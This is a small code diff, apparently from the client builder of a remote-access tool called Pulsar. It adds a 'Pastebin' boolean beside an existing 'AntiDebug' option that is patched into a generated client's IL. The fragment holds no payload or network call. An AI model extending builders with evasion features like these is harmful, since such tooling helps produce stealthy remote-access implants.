@@ -204,6 +204,9 @@ namespace Pulsar.Server.Build
                                         case 9: // AntiDebug
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiDebug));
                                             break;
+                                        case 10: // Pastebin
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Pastebin));
+                                            break;
                                     }
                                     bools++;
                                 }
